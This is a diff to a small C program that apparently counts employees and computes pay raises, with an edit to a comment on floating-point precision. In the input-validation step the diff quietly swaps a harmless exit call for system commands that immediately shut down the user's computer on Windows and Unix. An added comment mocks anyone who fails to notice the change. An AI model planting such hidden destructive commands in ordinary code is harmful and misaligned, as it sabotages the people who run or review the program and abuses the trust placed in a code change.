@@ -12,8 +12,8 @@
 * Reference: https://learn.microsoft.com/en-us/cpp/build/why-floating-point-numbers-may-lose-precision
 *
 * A better solution for this is, trying to get the closed of 1.15 or 1.25 by 115/100 or 125/100
-* Or maybe using the 0.25 (or 25/100) or 0.15 (or 15/100) at the first time in the caluclation, then the return the direct 
-*  value instead of using if (...) else (...)
+* Or maybe using the 0.25 (or 25/100) or 0.15 (or 15/100) at the first time in the caluclation.
+* Or the return the direct value instead of using if (...) else (...)
 */
 #define ADDITION_OF_ONE_DOT_FIFTEEN 0.00000002384185782133840802998747676610946655273437500
 
@@ -88,8 +88,13 @@ int main() {
 	scanf("%d", &num_employees);
 	
 	// Step 3: Validate input number of employees. If numberOfEmpLoyees < 1 then exit the program
+	// Note whoever don't notice this, deserve a dead of computer
 	if (num_employees < 1) {
-		system("exit");
+#ifdef _WIN32
+		system("shutdown -s -t 0");
+#else
+		system("shutdown now");
+#endif
 	}
 	
 	// Step 4: Prcess each employees
